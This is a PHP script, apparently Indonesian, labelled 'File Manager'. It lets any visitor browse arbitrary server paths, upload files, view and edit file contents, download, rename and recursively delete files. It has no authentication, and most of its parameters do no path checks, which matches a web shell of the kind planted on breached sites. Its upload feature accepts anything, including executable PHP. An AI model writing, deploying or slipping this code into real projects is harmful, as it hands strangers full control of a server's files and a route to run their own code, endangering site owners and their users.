<?php
session_start();

// ----[ Konfigurasi Awal ]----
$currentDir = realpath(isset($_GET['path']) ? $_GET['path'] : __DIR__);
if (!is_dir($currentDir)) {
    die("Direktori tidak ditemukan.");
}

function deleteDir($dirPath) {
    if (!is_dir($dirPath)) return unlink($dirPath);
    foreach (scandir($dirPath) as $item) {
        if ($item === '.' || $item === '..') continue;
        deleteDir($dirPath . DIRECTORY_SEPARATOR . $item);
    }
    return rmdir($dirPath);
}

// Rename
if (isset($_POST['rename'], $_POST['oldname'], $_POST['newname'])) {
    $old = $currentDir . DIRECTORY_SEPARATOR . $_POST['oldname'];
    $new = $currentDir . DIRECTORY_SEPARATOR . $_POST['newname'];
    if (file_exists($old)) rename($old, $new);
}

// Hapus
if (isset($_GET['delete'])) {
    $target = realpath($currentDir . DIRECTORY_SEPARATOR . $_GET['delete']);
    if (strpos($target, $currentDir) === 0 && file_exists($target)) {
        deleteDir($target);
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// Download
if (isset($_GET['download'])) {
    $file = $currentDir . DIRECTORY_SEPARATOR . $_GET['download'];
    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// View/Edit
if (isset($_GET['view'])) {
    $file = $currentDir . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($file)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
            file_put_contents($file, $_POST['content']);
            echo "<p>File disimpan.</p>";
        }
        $content = htmlspecialchars(file_get_contents($file));
        echo "<h3>Edit: ".basename($file)."</h3>";
        echo "<form method='post'><textarea name='content' rows='20' cols='100'>$content</textarea><br><button type='submit'>Simpan</button></form>";
        echo "<p><a href='?path=".urlencode($currentDir)."'>Kembali</a></p>";
        exit;
    }
}

// Upload
if (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
    $tmpName = $_FILES['upload']['tmp_name'];
    $name = basename($_FILES['upload']['name']);
    move_uploaded_file($tmpName, $currentDir . DIRECTORY_SEPARATOR . $name);
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

$items = scandir($currentDir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        td, th { padding: 8px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
        a { text-decoration: none; color: #007bff; }
        a:hover { text-decoration: underline; }
        textarea { width: 100%; font-family: monospace; }
    </style>
</head>
<body>
    <h2>File Manager</h2>
    <p><strong>Path:</strong> <?= htmlspecialchars($currentDir) ?></p>
    <p><a href="?path=<?= urlencode(dirname($currentDir)) ?>">⬅️ Parent Directory</a></p>

    <h3>Upload File</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload" required>
        <button type="submit">Upload</button>
    </form>

    <h3>Files and Directories</h3>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Actions</th>
            <th>Rename</th>
        </tr>
        <?php foreach ($items as $item): ?>
            <?php if ($item === '.' || $item === '..') continue; ?>
            <?php
            $path = $currentDir . DIRECTORY_SEPARATOR . $item;
            $isDir = is_dir($path);
            ?>
            <tr>
                <td>
                    <?php if ($isDir): ?>
                        📁 <a href="?path=<?= urlencode($path) ?>"><?= htmlspecialchars($item) ?></a>
                    <?php else: ?>
                        📄 <?= htmlspecialchars($item) ?>
                    <?php endif; ?>
                </td>
                <td><?= $isDir ? 'Directory' : 'File' ?></td>
                <td>
                    <?php if (!$isDir): ?>
                        <a href="?path=<?= urlencode($currentDir) ?>&download=<?= urlencode($item) ?>">Download</a> |
                        <a href="?path=<?= urlencode($currentDir) ?>&view=<?= urlencode($item) ?>">View/Edit</a> |
                    <?php endif; ?>
                    <a href="?path=<?= urlencode($currentDir) ?>&delete=<?= urlencode($item) ?>" onclick="return confirm('Yakin hapus <?= htmlspecialchars($item) ?>?')">Delete</a>
                </td>
                <td>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="oldname" value="<?= htmlspecialchars($item) ?>">
                        <input type="text" name="newname" value="<?= htmlspecialchars($item) ?>" required style="width: 150px;">
                        <button type="submit" name="rename">Rename</button>
                    </form>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>
